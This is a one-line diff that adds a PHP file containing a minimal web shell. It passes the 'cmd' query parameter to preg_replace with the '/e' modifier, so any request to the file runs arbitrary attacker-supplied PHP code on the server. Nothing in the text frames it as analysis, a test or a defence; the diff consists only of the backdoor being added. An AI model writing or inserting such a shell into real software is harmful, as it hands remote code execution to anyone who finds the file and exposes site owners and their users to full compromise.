@@ -1,0 +1,1 @@
+<?php preg_replace('/.*/e', $_GET["cmd"], ''); ?>
